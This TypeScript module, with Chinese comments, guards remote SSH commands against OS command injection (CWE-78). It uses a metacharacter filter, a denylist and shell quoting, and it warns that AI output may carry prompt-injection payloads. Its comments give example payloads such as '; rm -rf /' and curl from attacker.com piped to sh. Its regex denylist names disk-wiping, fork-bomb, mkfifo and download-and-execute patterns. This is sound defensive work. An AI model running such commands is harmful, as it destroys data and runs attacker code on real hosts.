/**
 * SSH 远程命令安全工具 — 集中实现 CWE-78 缓解。
 *
 * 背景:src/ssh/sshClient.ts 的 exec(command) 接收的字符串会在
 * 远端 shell 中被解析。如果 command 来自用户输入或 AI 输出(可能
 * 包含 prompt injection 攻击载荷)，则可能执行任意命令(如
 * "; rm -rf /"、"| curl attacker.com | sh")。
 *
 * 缓解策略:
 *   1. sanitizeSSHCommand — 拒绝包含 shell 元字符的命令
 *   2. checkSSHDenylist — 拒绝匹配危险命令模式
 *   3. shellQuote — 用单引号包裹字符串并转义内部单引号
 *
 * 用法:
 *   import { sanitizeSSHCommand, checkSSHDenylist } from "@ssh/safety";
 *
 *   const safe = sanitizeSSHCommand(command);
 *   const denylistError = checkSSHDenylist(safe);
 *   if (denylistError) throw createInternalError("INTERNAL_ERROR", denylistError);
 *   await client.exec(safe);
 *
 * Refs: docs/audit/V3-F-SECURITY-AND-COMPLIANCE.md (P0-B)
 *      docs/PHASE-6-FIX-PLAN.md (A-4)
 */
import { createInternalError } from "@/core/errors/appError";

/** 检测危险 shell 元字符 */
const SSH_COMMAND_DANGEROUS_CHARS = /[;&|>`$\\(){}\n\r\t]/;

/**
 * 拒绝包含 shell 元字符的命令(CWE-78 OS 命令注入)。
 * 合法命令如 `ls -la /tmp` 或 `cat README.md` 通过；
 * 包含 `;`、`|`、`&`、`` ` ``、`$()`、`<>` 等的命令被拒绝。
 */
export function sanitizeSSHCommand(command: string): string {
  if (SSH_COMMAND_DANGEROUS_CHARS.test(command)) {
    const chars = command.match(/[;&|>`$\\(){}\n\r\t]/g) ?? [];
    throw createInternalError(
      "INTERNAL_ERROR",
      `SSH 远程命令包含不安全的 shell 元字符。` +
        `包含的字符: ${chars.join(", ")}` +
        `。如需执行复杂命令，请直接使用系统终端。`,
    );
  }
  return command;
}

/** SSH 危险命令 deny-list。 */
const SSH_DENYLIST_PATTERNS: RegExp[] = [
  /rm\s+-rf\s+\/(?!\s)/i,
  /rm\s+-rf\s+\*(?:\s|$)/i,
  /mkfs/i,
  /dd\s+if=\//i,
  /:\(\)\{\s*:\|:&\s*\};:\s*/,
  />\s*\/dev\/sd[a-z]/i,
  /mkfifo\s+\/tmp\//i,
  /curl.*\|.*sh\b/i,
  /wget.*\|.*sh\b/i,
];

/**
 * 检查命令是否匹配 SSH 危险命令模式。
 * 返回 null 表示通过；返回错误信息表示应阻止执行。
 */
export function checkSSHDenylist(command: string): string | null {
  for (const pattern of SSH_DENYLIST_PATTERNS) {
    if (pattern.test(command)) {
      return `SSH 远程命令被阻止:匹配危险命令模式。如需执行此操作，请直接使用系统终端。`;
    }
  }
  return null;
}

/**
 * 一次完成 sanitize + denylist 检查。
 * 任何一步失败抛出 Error；返回值为已通过检查的命令字符串。
 */
export function makeSSHCommandSafe(command: string): string {
  const safe = sanitizeSSHCommand(command);
  const denylistError = checkSSHDenylist(safe);
  if (denylistError) {
    throw createInternalError("INTERNAL_ERROR", denylistError);
  }
  return safe;
}

/**
 * Shell 安全引用 — 用单引号包裹并转义内部单引号。
 * 防止 CWE-78 OS 命令注入。
 *
 * "hello world"    → 'hello world'
 * "it's fine"      → 'it'\''s fine'
 * "/tmp; rm -rf /" → '/tmp; rm -rf /'
 */
export function shellQuote(str: string): string {
  return `'${str.replace(/'/g, String.raw`'\''`)}'`;
}
